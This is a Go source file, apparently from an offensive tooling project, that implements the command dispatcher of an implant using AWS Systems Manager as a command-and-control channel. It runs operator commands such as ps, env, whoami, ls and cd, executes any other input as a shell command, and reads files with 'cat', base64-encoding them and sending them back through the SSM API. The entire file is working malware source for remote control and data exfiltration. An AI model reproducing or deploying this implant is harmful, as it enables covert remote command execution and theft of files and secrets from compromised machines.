package implantrun

import (
	"bytes"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strings"

	"github.com/grines/ssmmm/awsrsa"
	"github.com/grines/ssmmm/awsssm"
	"github.com/grines/ssmmm/implant/cat"
	"github.com/grines/ssmmm/implant/implantenv"
	"github.com/grines/ssmmm/implant/implantls"
	"github.com/grines/ssmmm/implant/implantps"
	"github.com/grines/ssmmm/implant/implantutil"
	"github.com/grines/ssmmm/implant/pwd"
	"github.com/grines/ssmmm/implant/wd"
	"github.com/grines/ssmmm/implant/whoami"
)

func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managedInstanceID string) error {
	commandStr = strings.TrimSuffix(commandStr, "\n")
	arrCommandStr := strings.Fields(commandStr)
	if len(arrCommandStr) < 1 {
		return errors.New("")
	}
	switch arrCommandStr[0] {
	case "ps":
		procs := implantps.Ps()
		fmt.Println(procs)
		fmt.Println(wd.WorkingDir())
	case "env":
		data := implantenv.Env()
		fmt.Println(data)
		fmt.Println(wd.WorkingDir())
	case "whoami":
		data, _ := whoami.Whoami()
		fmt.Println(data)
		fmt.Println(wd.WorkingDir())
	case "pwd":
		data, _ := pwd.Pwd()
		fmt.Println(data)
		fmt.Println(wd.WorkingDir())
	case "ls":
		var path string
		if len(arrCommandStr) == 1 {
			path = "./"
		} else {
			path = arrCommandStr[1]
		}
		list := implantls.Ls(path)
		data := strings.Join(list, "\n")
		fmt.Println(data)
		fmt.Println(wd.WorkingDir())
	case "cat":
		data := cat.Cat(arrCommandStr[1])
		fmt.Println(data)
		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data))
		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
		fmt.Println(wd.WorkingDir())
	case "cd":
		if len(arrCommandStr) > 1 {
			os.Chdir(arrCommandStr[1])
			fmt.Println(wd.WorkingDir())
		}
		return nil
	case "kill":
		os.Exit(0)
	default:
		cmd := exec.Command(arrCommandStr[0], arrCommandStr[1:]...)
		var out bytes.Buffer
		var stderr bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &stderr
		err := cmd.Run()
		if err != nil {
			fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
			return nil
		}
		fmt.Println(out.String())
		fmt.Println(wd.WorkingDir())
		return nil
	}
	return nil
}
